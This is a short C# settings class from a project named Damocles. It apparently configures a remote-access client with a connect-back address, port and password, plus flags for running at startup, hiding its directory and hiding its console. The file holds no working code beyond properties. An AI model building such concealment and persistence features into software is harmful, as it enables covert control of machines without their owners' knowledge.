namespace Damocles;

public sealed class ClientLaunchSettings
{
    public ClientLaunchSettings(int port, string address, string password, bool startup, bool directoryHidden, bool hideConsole)
    {
        Port = port;
        Address = address;
        Password = password;
        Startup = startup;
        DirectoryHidden = directoryHidden;
        HideConsole = hideConsole;
    }

    public int Port { get; }
    public string Address { get; }
    public string Password { get; }
    public bool Startup { get; }
    public bool DirectoryHidden { get; }
    public bool HideConsole { get; }
}